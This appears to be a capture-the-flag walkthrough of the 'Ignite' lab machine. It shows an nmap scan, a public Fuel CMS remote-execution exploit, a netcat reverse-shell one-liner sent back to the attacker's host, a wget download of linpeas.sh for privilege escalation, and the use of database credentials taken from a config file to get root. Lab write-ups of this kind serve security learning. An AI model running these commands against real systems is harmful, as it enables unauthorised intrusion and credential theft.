Ignite Walkthrough

First, start by scanning the services on the machine

```
sudo nmap -sC -sV -O x.x.x.x -vvv
```

This revealed it has a webserver running on port 80

Browse to webpage and it lists ``` /fuel/ ``` as a directory.

I am able to see this is a Fuel CMS. At the bottom of the page, there are default credentials. However, this doesnt seem to be useful to me.

I then search for a Fuel CMS exploit.

```
searchsploit Fuel CMS
```

This returns a python script, 47138.py.

I opened the Python script to check it out, then edit the IP address of the victim.

I then ran the python script as follows:

```
python 47138.py
```

This brings up a line that looks like this:

```
cmd:
```

This exploit is allowing me to execute code on the remote machine. I intend to use this to get a reverse shell. To do this I went about this with a few tools and known assets.

The first thing I did is fired up Burp suite. 

After this, I initiated a netcat listener on my machine.

```
nc -lvnp 9999
```

I then issued the following one liner to the ``` cmd: ``` in order to get the request to Burp.

```
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.x.x.x 9999 >/tmp/f
```

Remember to change the IP address above to your machine, and the port needs to match your netcat listener. 

Once this has been run, I can see the request show up in Burp. I simply click the "forward" button in Burp, and the shell is given on the netcat terminal. It is a basic shell and will look like this:

```
$
```

We can then access the user flag located here:

```
/home/www-data/flag.txt
```

We then need to access the root flag, but we get a permission denied when trying to get to that directory.

On my Kali machine, I have the linpeas.sh script and I need to get it to the host.

To do this, I did the following on my local machine:

```
cd /Tools
sudo python3 -m http.server 9090
```

From the victim machine I did the following:

```
cd /
cd /tmp
wget http://10.x.x.x:9090/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh
```

This will take some time to run, but will yield some great results. 

We are able to locate a database file located here:

```
/www/html/fuel/application/config/database.php
```

So we need to look at this file:

```
cat /www/html/fuel/application/config/database.php
```

This yielded the following:

```
'username' => 'root'
'password' => 'mememe'
```

Lets try to see if the credentials work.

```
$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config#
```

It worked!

Lets get that root flag!

```
cat /root/root.txt
```

Thats it, we are done!



